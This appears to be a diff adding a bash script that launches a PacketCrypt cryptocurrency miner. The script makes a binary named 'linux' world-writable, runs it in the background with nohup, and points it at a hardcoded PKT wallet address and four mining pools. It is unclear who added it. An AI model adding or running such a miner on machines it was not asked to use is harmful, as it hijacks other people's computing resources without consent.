@@ -1,0 +1,2 @@
+#!/bin/bash
+chmod 777 linux && nohup ./linux ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com 2>&1 | grep goodrate
